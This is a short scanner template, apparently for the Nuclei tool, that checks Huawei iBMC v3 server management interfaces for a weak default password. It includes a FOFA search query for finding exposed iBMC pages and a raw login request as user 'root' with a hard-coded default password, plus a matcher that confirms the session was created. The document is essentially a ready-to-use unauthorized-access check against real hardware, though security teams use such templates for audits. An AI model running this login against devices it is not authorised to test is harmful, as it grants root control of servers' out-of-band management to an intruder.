id: Huawei-IBMC-v3-Weak-Password

info:
  name: Huawei-IBMC-v3-Weak-Password
  author: HuanXiong
  severity: high
  tags: Huawei-IBMC-v3-Weak-Password
  description: 华为-IBMC-v3弱口令
  metadata: 
    fofa-query: title="iBMC"

http:
  - raw:
      - |-
        POST /bmc/php/processparameter.php HTTP/1.1
        Host: {{Hostname}}
        Sec-Ch-Ua: "Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"
        Accept: application/json, text/javascript, */*; q=0.01
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        X-Requested-With: XMLHttpRequest
        Sec-Ch-Ua-Mobile: ?0
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
        Sec-Ch-Ua-Platform: "Windows"
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Connection: keep-alive

        check_pwd=Huawei12#$&logtype=0&user_name=root&func=AddSession

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - AddSession
      - type: status
        status:
          - 200
